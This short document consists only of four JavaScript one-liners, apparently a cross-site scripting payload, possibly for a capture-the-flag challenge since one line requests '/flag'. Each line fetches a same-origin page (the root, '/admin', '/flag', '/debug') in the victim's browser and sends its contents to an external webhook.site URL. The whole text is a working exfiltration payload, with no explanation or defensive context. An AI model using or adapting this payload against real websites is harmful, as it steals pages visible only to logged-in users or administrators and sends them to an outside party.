fetch('/').then(r=>r.text()).then(t=>fetch('https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a/page?p='+encodeURIComponent(t)))
fetch('/admin').then(r=>r.text()).then(t=>fetch('https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a/admin?p='+encodeURIComponent(t)))
fetch('/flag').then(r=>r.text()).then(t=>fetch('https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a/flag?p='+encodeURIComponent(t)))
fetch('/debug').then(r=>r.text()).then(t=>fetch('https://webhook.site/39b226d4-f904-47c4-81fa-28fb8924387a/debug?p='+encodeURIComponent(t)))
